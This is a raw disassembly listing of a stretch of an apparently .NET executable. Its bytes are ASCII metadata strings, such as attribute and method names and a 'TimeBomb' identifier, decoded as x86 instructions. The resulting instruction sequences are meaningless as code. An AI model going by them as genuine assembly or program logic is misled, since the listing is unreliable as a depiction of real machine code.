  403537:	add    BYTE PTR fs:[ebx+0x71],dl
  40353b:	ins    BYTE PTR es:[edi],dx
  40353c:	dec    ecx
  40353d:	outs   dx,BYTE PTR ds:[esi]
  40353e:	jae    0x4035b4
  403540:	popa   
  403541:	outs   dx,BYTE PTR ds:[esi]
  403542:	arpl   WORD PTR [ebp+0x49],sp
  403545:	inc    esp
  403546:	push   eax
  403547:	jb     0x4035ae
  403549:	imul   di,WORD PTR [eax+0x0],0x7341
  40354f:	dec    ecx
  403550:	outs   dx,BYTE PTR ds:[esi]
  403551:	jae    0x4035c7
  403553:	popa   
  403554:	outs   dx,BYTE PTR ds:[esi]
  403555:	arpl   WORD PTR [ebp+0x49],sp
  403558:	inc    esp
  403559:	push   eax
  40355a:	jb     0x4035c1
  40355c:	imul   di,WORD PTR [eax+0x0],0x7352
  403562:	dec    ecx
  403563:	outs   dx,BYTE PTR ds:[esi]
  403564:	jae    0x4035da
  403566:	popa   
  403567:	outs   dx,BYTE PTR ds:[esi]
  403568:	arpl   WORD PTR [ebp+0x49],sp
  40356b:	inc    esp
  40356c:	push   eax
  40356d:	jb     0x4035d4
  40356f:	imul   di,WORD PTR [eax+0x0],0x614d
  403575:	js     0x4035c4
  403577:	popa   
  403578:	imul   ebp,DWORD PTR [esi+0x74],0x6e616e65
  40357f:	arpl   WORD PTR [ebp+0x56],sp
  403582:	gs jb  0x4035f8
  403585:	imul   ebp,DWORD PTR [edi+0x6e],0x61766500
  40358c:	ins    BYTE PTR es:[edi],dx
  40358d:	push   esp
  40358e:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  403595:	push   esi
  403596:	popa   
  403597:	ins    BYTE PTR es:[edi],dx
  403598:	jne    0x4035ff
  40359a:	add    BYTE PTR [ebx+0x75],ah
  40359d:	jb     0x403611
  40359f:	outs   dx,BYTE PTR gs:[esi]
  4035a1:	je     0x4035f5
  4035a3:	gs ins BYTE PTR es:[edi],dx
  4035a5:	gs popa 
  4035a7:	jae    0x40360e
  4035a9:	push   esp
  4035aa:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  4035b1:	push   esi
  4035b2:	popa   
  4035b3:	ins    BYTE PTR es:[edi],dx
  4035b4:	jne    0x40361b
  4035b6:	add    BYTE PTR [edi+0x65],dl
  4035b9:	jb     0x403600
  4035bb:	jbe    0x403622
  4035bd:	outs   dx,BYTE PTR ds:[esi]
  4035be:	je     0x40360e
  4035c0:	popa   
  4035c1:	ins    DWORD PTR es:[edi],dx
  4035c2:	gs push ebx
  4035c4:	gs je  0x40363c
  4035c7:	jo     0x403616
  4035c9:	jae    0x403634
  4035cb:	add    BYTE PTR [edi+0x65],dl
  4035ce:	jb     0x403615
  4035d0:	jbe    0x403637
  4035d2:	outs   dx,BYTE PTR ds:[esi]
  4035d3:	je     0x403623
  4035d5:	popa   
  4035d6:	ins    DWORD PTR es:[edi],dx
  4035d7:	gs push ebx
  4035d9:	gs je  0x403651
  4035dc:	jo     0x403621
  4035de:	outs   dx,DWORD PTR ds:[esi]
  4035df:	outs   dx,BYTE PTR ds:[esi]
  4035e0:	imul   sp,WORD PTR [edi+0x0],0x5341
  4035e6:	push   ebp
  4035e7:	jae    0x40364a
  4035e9:	addr16 gs dec ebp
  4035ec:	gs je  0x403661
  4035ef:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  4035f6:	inc    edi
  4035f7:	jne    0x403662
  4035f9:	fs push ebx
  4035fb:	je     0x40366f
  4035fd:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  403604:	jae    0x40366f
  403606:	outs   dx,DWORD PTR ds:[esi]
  403607:	outs   dx,BYTE PTR ds:[esi]
  403608:	inc    edx
  403609:	dec    ecx
  40360a:	inc    esp
  40360b:	push   ebx
  40360c:	dec    eax
  40360d:	gs ins BYTE PTR es:[edi],dx
  40360f:	jo     0x40365f
  403611:	popa   
  403612:	ins    DWORD PTR es:[edi],dx
  403613:	gs jae 0x403686
  403616:	popa   
  403617:	arpl   WORD PTR [ebp+0x0],sp
  40361a:	push   esi
  40361b:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403622:	jne    0x403688
  403624:	imul   ebp,DWORD PTR [edi+0x53],0x6c6c6568
  40362b:	push   esi
  40362c:	gs jb  0x4036a2
  40362f:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  403636:	pop    edi
  403637:	push   esi
  403638:	gs jb  0x4036ae
  40363b:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  403642:	dec    esi
  403643:	popa   
  403644:	ins    DWORD PTR es:[edi],dx
  403645:	gs jae 0x4036b8
  403648:	popa   
  403649:	arpl   WORD PTR [ebp+0x0],sp
  40364c:	push   esi
  40364d:	gs jb  0x4036c3
  403650:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  403657:	dec    esi
  403658:	popa   
  403659:	ins    DWORD PTR es:[edi],dx
  40365a:	gs jae 0x4036cd
  40365d:	popa   
  40365e:	arpl   WORD PTR [ebp+0x0],sp
  403661:	fs popa 
  403663:	add    BYTE PTR [ecx+0x69],dh
  403666:	add    BYTE PTR [ebx+0x65],dh
  403669:	ins    DWORD PTR es:[edi],dx
  40366a:	add    BYTE PTR [edx+eiz*2+0x4e],ah
  40366e:	popa   
  40366f:	ins    DWORD PTR es:[edi],dx
  403670:	add    BYTE PTR gs:[edx+eiz*2+0x53],ah
  403675:	gs jb  0x4036ee
  403678:	gs jb  0x4036c9
  40367b:	popa   
  40367c:	ins    DWORD PTR es:[edi],dx
  40367d:	add    BYTE PTR gs:[ebx+0x6f],ah
  403681:	outs   dx,BYTE PTR ds:[esi]
  403682:	outs   dx,BYTE PTR ds:[esi]
  403683:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403688:	outs   dx,BYTE PTR ds:[esi]
  403689:	push   esp
  40368a:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  403691:	ins    BYTE PTR es:[edi],dx
  403692:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  403699:	dec    ebp
  40369a:	imul   ebp,DWORD PTR [esi+0x69],0x536d756d
  4036a1:	arpl   WORD PTR gs:[eax],ax
  4036a4:	ins    BYTE PTR es:[edi],dx
  4036a5:	outs   dx,DWORD PTR ds:[esi]
  4036a6:	addr16 imul ebp,DWORD PTR [bp+0x67],0x6576654c
  4036af:	ins    BYTE PTR es:[edi],dx
  4036b0:	add    BYTE PTR [ebp+0x6e],ah
  4036b3:	arpl   WORD PTR [edx+0x79],si
  4036b6:	jo     0x40372c
  4036b8:	imul   ebp,DWORD PTR [edi+0x6e],0x79654b
  4036bf:	ins    DWORD PTR es:[edi],dx
  4036c0:	imul   eax,DWORD PTR [eax],0x6f0072
  4036c6:	popa   
  4036c7:	jb     0x403730
  4036c9:	jae    0x4036cb
  4036cb:	imul   esp,DWORD PTR [ebp+0x79],0x49
  4036cf:	outs   dx,BYTE PTR ds:[esi]
  4036d0:	push   ebx
  4036d1:	je     0x403745
  4036d3:	imul   ebp,DWORD PTR [esi+0x67],0x79656b00
  4036da:	dec    ecx
  4036db:	outs   dx,BYTE PTR ds:[esi]
  4036dc:	inc    esp
  4036dd:	popa   
  4036de:	je     0x403741
  4036e0:	add    BYTE PTR [ebx+0x79],dl
  4036e3:	jae    0x403759
  4036e5:	gs ins DWORD PTR es:[edi],dx
  4036e7:	cs push edx
  4036e9:	jne    0x403759
  4036eb:	je     0x403756
  4036ed:	ins    DWORD PTR es:[edi],dx
  4036ee:	gs cs dec ecx
  4036f1:	outs   dx,BYTE PTR ds:[esi]
  4036f2:	je     0x403759
  4036f4:	jb     0x403765
  4036f6:	jo     0x40374b
  4036f8:	gs jb  0x403771
  4036fb:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  403702:	je     0x403745
  403704:	je     0x40377a
  403706:	jb     0x403771
  403708:	bound  esi,QWORD PTR [ebp+0x74]
  40370b:	add    BYTE PTR gs:[ebx+0x6f],al
  40370f:	ins    DWORD PTR es:[edi],dx
  403710:	push   esi
  403711:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  403718:	je     0x40378e
  40371a:	jb     0x403785
  40371c:	bound  esi,QWORD PTR [ebp+0x74]
  40371f:	add    BYTE PTR gs:[ebx+0x79],dl
  403723:	jae    0x403799
  403725:	gs ins DWORD PTR es:[edi],dx
  403727:	cs push edx
  403729:	gs data16 ins BYTE PTR es:[edi],dx
  40372c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403731:	outs   dx,BYTE PTR ds:[esi]
  403732:	add    BYTE PTR [ecx+0x73],al
  403735:	jae    0x40379c
  403737:	ins    DWORD PTR es:[edi],dx
  403738:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40373c:	gs jb  0x4037b2
  40373f:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403746:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40374d:	jae    0x4037c2
  40374f:	gs ins DWORD PTR es:[edi],dx
  403751:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  403755:	jb     0x4037c6
  403757:	fs jne 0x4037bd
  40375a:	je     0x40379d
  40375c:	je     0x4037d2
  40375e:	jb     0x4037c9
  403760:	bound  esi,QWORD PTR [ebp+0x74]
  403763:	add    BYTE PTR gs:[ecx+0x73],al
  403767:	jae    0x4037ce
  403769:	ins    DWORD PTR es:[edi],dx
  40376a:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40376e:	outs   dx,DWORD PTR ds:[esi]
  40376f:	jo     0x4037ea
  403771:	jb     0x4037dc
  403773:	addr16 push 0x74744174
  403779:	jb     0x4037e4
  40377b:	bound  esi,QWORD PTR [ebp+0x74]
  40377e:	add    BYTE PTR gs:[ecx+0x73],al
  403782:	jae    0x4037e9
  403784:	ins    DWORD PTR es:[edi],dx
  403785:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403789:	outs   dx,DWORD PTR ds:[esi]
  40378a:	ins    DWORD PTR es:[edi],dx
  40378b:	jo     0x4037ee
  40378d:	outs   dx,BYTE PTR ds:[esi]
  40378e:	jns    0x4037d1
  403790:	je     0x403806
  403792:	jb     0x4037fd
  403794:	bound  esi,QWORD PTR [ebp+0x74]
  403797:	add    BYTE PTR gs:[ecx+0x73],al
  40379b:	jae    0x403802
  40379d:	ins    DWORD PTR es:[edi],dx
  40379e:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4037a2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4037aa:	outs   dx,DWORD PTR ds:[esi]
  4037ab:	outs   dx,BYTE PTR ds:[esi]
  4037ac:	inc    ecx
  4037ad:	je     0x403823
  4037af:	jb     0x40381a
  4037b1:	bound  esi,QWORD PTR [ebp+0x74]
  4037b4:	add    BYTE PTR gs:[ecx+0x73],al
  4037b8:	jae    0x40381f
  4037ba:	ins    DWORD PTR es:[edi],dx
  4037bb:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4037bf:	outs   dx,BYTE PTR ds:[esi]
  4037c0:	outs   dx,WORD PTR ds:[esi]
  4037c2:	jb     0x403831
  4037c4:	popa   
  4037c5:	je     0x403830
  4037c7:	outs   dx,DWORD PTR ds:[esi]
  4037c8:	outs   dx,BYTE PTR ds:[esi]
  4037c9:	popa   
  4037ca:	ins    BYTE PTR es:[edi],dx
  4037cb:	push   esi
  4037cc:	gs jb  0x403842
  4037cf:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4037d6:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4037dd:	jae    0x403852
  4037df:	gs ins DWORD PTR es:[edi],dx
  4037e1:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  4037e5:	gs jns 0x40382e
  4037e8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4037f0:	bound  esi,QWORD PTR [ebp+0x74]
  4037f3:	add    BYTE PTR gs:[ecx+0x73],al
  4037f7:	jae    0x40385e
  4037f9:	ins    DWORD PTR es:[edi],dx
  4037fa:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4037fe:	gs ins BYTE PTR es:[edi],dx
  403800:	popa   
  403801:	jns    0x403856
  403803:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  40380a:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403811:	jae    0x403886
  403813:	gs ins DWORD PTR es:[edi],dx
  403815:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  403819:	jb     0x40387c
  40381b:	fs gs ins DWORD PTR es:[edi],dx
  40381e:	popa   
  40381f:	jb     0x40388c
  403821:	inc    ecx
  403822:	je     0x403898
  403824:	jb     0x40388f
  403826:	bound  esi,QWORD PTR [ebp+0x74]
  403829:	add    BYTE PTR gs:[ecx+0x73],al
  40382d:	jae    0x403894
  40382f:	ins    DWORD PTR es:[edi],dx
  403830:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  403834:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  40383c:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403843:	jae    0x4038b8
  403845:	gs ins DWORD PTR es:[edi],dx
  403847:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40384b:	gs jae 0x4038b1
  40384e:	jb     0x4038b9
  403850:	jo     0x4038c6
  403852:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403859:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403860:	jae    0x4038d5
  403862:	gs ins DWORD PTR es:[edi],dx
  403864:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403868:	outs   dx,DWORD PTR ds:[esi]
  403869:	outs   dx,BYTE PTR ds:[esi]
  40386a:	imul   sp,WORD PTR [edi+0x75],0x6172
  403870:	je     0x4038db
  403872:	outs   dx,DWORD PTR ds:[esi]
  403873:	outs   dx,BYTE PTR ds:[esi]
  403874:	inc    ecx
  403875:	je     0x4038eb
  403877:	jb     0x4038e2
  403879:	bound  esi,QWORD PTR [ebp+0x74]
  40387c:	add    BYTE PTR gs:[ecx+0x73],al
  403880:	jae    0x4038e7
  403882:	ins    DWORD PTR es:[edi],dx
  403883:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403887:	jne    0x4038f5
  403889:	je     0x403900
  40388b:	jb     0x4038f2
  40388d:	inc    ecx
  40388e:	je     0x403904
  403890:	jb     0x4038fb
  403892:	bound  esi,QWORD PTR [ebp+0x74]
  403895:	add    BYTE PTR gs:[ebx+0x79],dl
  403899:	jae    0x40390f
  40389b:	gs ins DWORD PTR es:[edi],dx
  40389d:	cs push edx
  40389f:	gs jae 0x403911
  4038a2:	jne    0x403916
  4038a4:	arpl   WORD PTR [ebp+0x73],sp
  4038a7:	add    BYTE PTR [esi+0x65],cl
  4038aa:	jne    0x403920
  4038ac:	jb     0x40390f
  4038ae:	ins    BYTE PTR es:[edi],dx
  4038af:	push   edx
  4038b0:	gs jae 0x403922
  4038b3:	jne    0x403927
  4038b5:	arpl   WORD PTR [ebp+0x73],sp
  4038b8:	dec    esp
  4038b9:	popa   
  4038ba:	outs   dx,BYTE PTR ds:[esi]
  4038bb:	addr16 jne 0x40391f
  4038be:	addr16 gs inc ecx
  4038c1:	je     0x403937
  4038c3:	jb     0x40392e
  4038c5:	bound  esi,QWORD PTR [ebp+0x74]
  4038c8:	add    BYTE PTR gs:[ebx+0x4c],al
  4038cc:	push   ebx
  4038cd:	inc    ebx
  4038ce:	outs   dx,DWORD PTR ds:[esi]
  4038cf:	ins    DWORD PTR es:[edi],dx
  4038d0:	jo     0x40393e
  4038d2:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4038d9:	jb     0x403944
  4038db:	bound  esi,QWORD PTR [ebp+0x74]
  4038de:	add    BYTE PTR gs:[ebx+0x79],dl
  4038e2:	jae    0x403958
  4038e4:	gs ins DWORD PTR es:[edi],dx
  4038e6:	cs push ebx
  4038e8:	arpl   WORD PTR gs:[ebp+0x72],si
  4038ec:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  4038f4:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  4038fb:	add    BYTE PTR [ebp+0x6e],al
  4038fe:	jbe    0x403969
  403900:	jb     0x403971
  403902:	outs   dx,BYTE PTR ds:[esi]
  403903:	ins    DWORD PTR es:[edi],dx
  403904:	outs   dx,BYTE PTR gs:[esi]
  403906:	je     0x403958
  403908:	gs jb  0x403978
  40390b:	imul   esi,DWORD PTR [ebx+0x73],0x416e6f69
  403912:	je     0x403988
  403914:	jb     0x40397f
  403916:	bound  esi,QWORD PTR [ebp+0x74]
  403919:	add    BYTE PTR gs:[ebx+0x65],dl
  40391d:	arpl   WORD PTR [ebp+0x72],si
  403920:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  403928:	outs   dx,BYTE PTR ds:[esi]
  403929:	add    BYTE PTR [ecx+0x73],al
  40392c:	jae    0x403993
  40392e:	ins    DWORD PTR es:[edi],dx
  40392f:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  403933:	gs jns 0x403984
  403936:	popa   
  403937:	ins    DWORD PTR es:[edi],dx
  403938:	gs inc ecx
  40393a:	je     0x4039b0
  40393c:	jb     0x4039a7
  40393e:	bound  esi,QWORD PTR [ebp+0x74]
  403941:	add    BYTE PTR gs:[ebx+0x79],dl
  403945:	jae    0x4039bb
  403947:	gs ins DWORD PTR es:[edi],dx
  403949:	cs inc esp
  40394b:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  403952:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  403959:	jne    0x4039c2
  40395b:	addr16 popa 
  40395d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403961:	je     0x4039d7
  403963:	jb     0x4039ce
  403965:	bound  esi,QWORD PTR [ebp+0x74]
  403968:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40396d:	jne    0x4039d6
  40396f:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  403977:	jae    0x403979
  403979:	push   ebx
  40397a:	jns    0x4039ef
  40397c:	je     0x4039e3
  40397e:	ins    DWORD PTR es:[edi],dx
  40397f:	cs push edx
  403981:	jne    0x4039f1
  403983:	je     0x4039ee
  403985:	ins    DWORD PTR es:[edi],dx
  403986:	gs cs inc ebx
  403989:	outs   dx,DWORD PTR ds:[esi]
  40398a:	ins    DWORD PTR es:[edi],dx
  40398b:	jo     0x4039f6
  40398d:	ins    BYTE PTR es:[edi],dx
  40398e:	gs jb  0x4039e4
  403991:	gs jb  0x403a0a
  403994:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  40399b:	ins    DWORD PTR es:[edi],dx
  40399c:	jo     0x403a07
  40399e:	ins    BYTE PTR es:[edi],dx
  40399f:	popa   
  4039a0:	je     0x403a0b
  4039a2:	outs   dx,DWORD PTR ds:[esi]
  4039a3:	outs   dx,BYTE PTR ds:[esi]
  4039a4:	push   edx
  4039a5:	gs ins BYTE PTR es:[edi],dx
  4039a7:	popa   
  4039a8:	js     0x403a0b
  4039aa:	je     0x403a15
  4039ac:	outs   dx,DWORD PTR ds:[esi]
  4039ad:	outs   dx,BYTE PTR ds:[esi]
  4039ae:	jae    0x4039f1
  4039b0:	je     0x403a26
  4039b2:	jb     0x403a1d
  4039b4:	bound  esi,QWORD PTR [ebp+0x74]
  4039b7:	add    BYTE PTR gs:[edx+0x75],dl
  4039bb:	outs   dx,BYTE PTR ds:[esi]
  4039bc:	je     0x403a27
  4039be:	ins    DWORD PTR es:[edi],dx
  4039bf:	gs inc ebx
  4039c1:	outs   dx,DWORD PTR ds:[esi]
  4039c2:	ins    DWORD PTR es:[edi],dx
  4039c3:	jo     0x403a26
  4039c5:	je     0x403a30
  4039c7:	bound  ebp,QWORD PTR [ecx+0x6c]
  4039ca:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4039d2:	bound  esi,QWORD PTR [ebp+0x74]
  4039d5:	add    BYTE PTR gs:[ecx+eiz*2+0x74],al
  4039da:	popa   
  4039db:	bound  esp,QWORD PTR [ecx+0x73]
  4039de:	gs dec ebp
  4039e0:	popa   
  4039e1:	imul   ebp,DWORD PTR [eax+eax*1+0x53],0x65747379
  4039e9:	ins    DWORD PTR es:[edi],dx
  4039ea:	cs push esp
  4039ec:	push   0x64616572
  4039f1:	imul   ebp,DWORD PTR [esi+0x67],0x746e4900
  4039f8:	gs jb  0x403a67
  4039fb:	outs   dx,DWORD PTR ds:[esi]
  4039fc:	arpl   WORD PTR [ebx+0x65],bp
  4039ff:	add    BYTE PTR fs:[eax+ebp*2+0x72],dl
  403a04:	gs popa 
  403a06:	add    BYTE PTR fs:[ebx+0x6c],dl
  403a0a:	gs gs jo 0x403a0e
  403a0e:	dec    edi
  403a0f:	jo     0x403a76
  403a11:	outs   dx,BYTE PTR ds:[esi]
  403a12:	inc    ebx
  403a13:	outs   dx,DWORD PTR ds:[esi]
  403a14:	outs   dx,BYTE PTR ds:[esi]
  403a15:	outs   dx,BYTE PTR ds:[esi]
  403a16:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403a1b:	outs   dx,BYTE PTR ds:[esi]
  403a1c:	add    BYTE PTR [edi+ebp*2+0x67],cl
  403a20:	addr16 gs jb 0x403a24
  403a24:	jae    0x403a8b
  403a26:	je     0x403a87
  403a28:	dec    esp
  403a29:	outs   dx,DWORD PTR ds:[esi]
  403a2a:	addr16 imul ebp,DWORD PTR [bp+0x67],0x6576654c
  403a33:	ins    BYTE PTR es:[edi],dx
  403a34:	add    BYTE PTR [eax+ebp*2+0x72],dl
  403a38:	gs popa 
  403a3a:	fs push eax
  403a3c:	outs   dx,DWORD PTR ds:[esi]
  403a3d:	outs   dx,DWORD PTR ds:[esi]
  403a3e:	ins    BYTE PTR es:[edi],dx
  403a3f:	add    BYTE PTR [edi+0x65],al
  403a42:	je     0x403a85
  403a44:	jbe    0x403aa7
  403a46:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x6854656c
  403a4e:	jb     0x403ab5
  403a50:	popa   
  403a51:	fs jae 0x403a54
  403a54:	dec    esp
  403a55:	outs   dx,DWORD PTR ds:[esi]
  403a56:	addr16 imul ebp,DWORD PTR [bp+0x67],0x6576654c
  403a5f:	ins    BYTE PTR es:[edi],dx
  403a60:	inc    ecx
  403a61:	je     0x403aaf
  403a63:	gs popa 
  403a65:	jae    0x403adb
  403a67:	add    BYTE PTR [edi+0x72],dl
  403a6a:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x7250676f
  403a72:	outs   dx,DWORD PTR ds:[esi]
  403a73:	arpl   WORD PTR [ebp+0x73],sp
  403a76:	jae    0x403acb
  403a78:	je     0x403adb
  403a7a:	jb     0x403af0
  403a7c:	jne    0x403aee
  403a7e:	add    BYTE PTR [ebx+0x6f],al
  403a81:	outs   dx,BYTE PTR ds:[esi]
  403a82:	outs   dx,BYTE PTR ds:[esi]
  403a83:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403a88:	outs   dx,BYTE PTR ds:[esi]
  403a89:	dec    ebp
  403a8a:	popa   
  403a8b:	outs   dx,BYTE PTR ds:[esi]
  403a8c:	popa   
  403a8d:	addr16 gs jb 0x403a91
  403a91:	addr16 gs je 0x403af4
  403a95:	inc    ebx
  403a96:	outs   dx,DWORD PTR ds:[esi]
  403a97:	outs   dx,BYTE PTR ds:[esi]
  403a98:	outs   dx,BYTE PTR ds:[esi]
  403a99:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403a9e:	outs   dx,BYTE PTR ds:[esi]
  403a9f:	dec    ebp
  403aa0:	popa   
  403aa1:	outs   dx,BYTE PTR ds:[esi]
  403aa2:	popa   
  403aa3:	addr16 gs jb 0x403aa7
  403aa7:	inc    ebx
  403aa8:	ins    BYTE PTR es:[edi],dx
  403aa9:	outs   dx,DWORD PTR ds:[esi]
  403aaa:	jae    0x403b11
  403aac:	inc    ebx
  403aad:	outs   dx,DWORD PTR ds:[esi]
  403aae:	outs   dx,BYTE PTR ds:[esi]
  403aaf:	outs   dx,BYTE PTR ds:[esi]
  403ab0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403ab5:	outs   dx,BYTE PTR ds:[esi]
  403ab6:	add    BYTE PTR [ecx+ebp*2+0x6d],dl
  403aba:	gs push ebx
  403abc:	jo     0x403b1f
  403abe:	outs   dx,BYTE PTR ds:[esi]
  403abf:	add    BYTE PTR [ecx+eiz*2+0x74],al
  403ac3:	gs push esp
  403ac5:	imul   ebp,DWORD PTR [ebp+0x65],0x74656700
  403acc:	pop    edi
  403acd:	dec    esi
  403ace:	outs   dx,DWORD PTR ds:[esi]
  403acf:	ja     0x403ad1
  403ad1:	outs   dx,DWORD PTR ds:[esi]
  403ad2:	jo     0x403b33
  403ad4:	push   ebx
  403ad5:	jne    0x403b39
  403ad7:	je     0x403b4b
  403ad9:	popa   
  403ada:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403ade:	outs   dx,BYTE PTR ds:[esi]
  403adf:	add    BYTE PTR [edi+0x70],ch
  403ae2:	pop    edi
  403ae3:	inc    edi
  403ae4:	jb     0x403b4b
  403ae6:	popa   
  403ae7:	je     0x403b4e
  403ae9:	jb     0x403b3f
  403aeb:	push   0x724f6e61
  403af0:	inc    ebp
  403af1:	jno    0x403b68
  403af3:	popa   
  403af4:	ins    BYTE PTR es:[edi],dx
  403af5:	add    BYTE PTR [ebx+0x65],dh
  403af8:	je     0x403b59
  403afa:	inc    ebp
  403afb:	outs   dx,BYTE PTR ds:[esi]
  403afc:	arpl   WORD PTR [edx+0x79],si
  403aff:	jo     0x403b75
  403b01:	imul   ebp,DWORD PTR [edi+0x6e],0x79654b
  403b08:	push   edi
  403b09:	popa   
  403b0a:	imul   esi,DWORD PTR [ebx+eax*2+0x61],0x61626c6c
  403b12:	arpl   WORD PTR [ebx+0x0],bp
  403b15:	push   ecx
  403b16:	jne    0x403b7d
  403b18:	jne    0x403b7f
  403b1a:	push   ebp
  403b1b:	jae    0x403b82
  403b1d:	jb     0x403b76
  403b1f:	outs   dx,DWORD PTR ds:[esi]
  403b20:	jb     0x403b8d
  403b22:	dec    ecx
  403b23:	je     0x403b8a
  403b25:	ins    DWORD PTR es:[edi],dx
  403b26:	add    BYTE PTR [ebp+0x78],al
  403b29:	arpl   WORD PTR [ebp+0x70],sp
  403b2c:	je     0x403b97
  403b2e:	outs   dx,DWORD PTR ds:[esi]
  403b2f:	outs   dx,BYTE PTR ds:[esi]
  403b30:	add    BYTE PTR [ebp+0x76],al
  403b33:	outs   dx,BYTE PTR gs:[esi]
  403b35:	je     0x403b8b
  403b37:	jns    0x403ba9
  403b39:	add    BYTE PTR gs:[edi+0x72],dl
  403b3d:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x5700676f
  403b45:	jb     0x403bb0
  403b47:	je     0x403bae
  403b49:	dec    esp
  403b4a:	outs   dx,DWORD PTR ds:[esi]
  403b4b:	addr16 push eax
  403b4d:	jb     0x403bbe
  403b4f:	arpl   WORD PTR [ebp+0x73],sp
  403b52:	jae    0x403ba7
  403b54:	push   0x6f647475
  403b59:	ja     0x403bc9
  403b5b:	add    BYTE PTR [edx+0x65],al
  403b5e:	imul   ebp,DWORD PTR [bp+0x54],0x736e6172
  403b66:	popa   
  403b67:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403b6b:	outs   dx,BYTE PTR ds:[esi]
  403b6c:	add    BYTE PTR [ebx+0x6f],al
  403b6f:	ins    DWORD PTR es:[edi],dx
  403b70:	ins    DWORD PTR es:[edi],dx
  403b71:	imul   esi,DWORD PTR [esp+edx*2+0x72],0x61736e61
  403b79:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403b7d:	outs   dx,BYTE PTR ds:[esi]
  403b7e:	add    BYTE PTR [edx+0x6f],dl
  403b81:	ins    BYTE PTR es:[edi],dx
  403b82:	ins    BYTE PTR es:[edi],dx
  403b83:	bound  esp,QWORD PTR [ecx+0x63]
  403b86:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x6e
  403b8b:	jae    0x403bee
  403b8d:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403b91:	outs   dx,BYTE PTR ds:[esi]
  403b92:	add    BYTE PTR [esi+0x6f],cl
  403b95:	push   ecx
  403b96:	jne    0x403bfd
  403b98:	jne    0x403bff
  403b9a:	inc    esp
  403b9b:	popa   
  403b9c:	je     0x403bff
  403b9e:	inc    ebp
  403b9f:	js     0x403c04
  403ba1:	gs jo  0x403c18
  403ba4:	imul   ebp,DWORD PTR [edi+0x6e],0x6c715300
  403bab:	inc    ebp
  403bac:	jb     0x403c20
  403bae:	outs   dx,DWORD PTR ds:[esi]
  403baf:	jb     0x403bff
  403bb1:	jne    0x403c20
  403bb3:	bound  esp,QWORD PTR [ebp+0x72]
  403bb6:	add    BYTE PTR [ebx+0x6f],al
  403bb9:	outs   dx,BYTE PTR ds:[esi]
  403bba:	jae    0x403c30
  403bbc:	popa   
  403bbd:	outs   dx,BYTE PTR ds:[esi]
  403bbe:	je     0x403c33
  403bc0:	add    BYTE PTR [ecx+0x75],dl
  403bc3:	gs jne 0x403c2b
  403bc6:	inc    esp
  403bc7:	imul   esi,DWORD PTR [ebx+0x61],0x64656c62
  403bce:	inc    ebp
  403bcf:	jb     0x403c43
  403bd1:	outs   dx,DWORD PTR ds:[esi]
  403bd2:	jb     0x403c22
  403bd4:	jne    0x403c43
  403bd6:	bound  esp,QWORD PTR [ebp+0x72]
  403bd9:	add    BYTE PTR [ebp+0x6e],dl
  403bdc:	imul   ebp,DWORD PTR [esi+0x6f],0x77
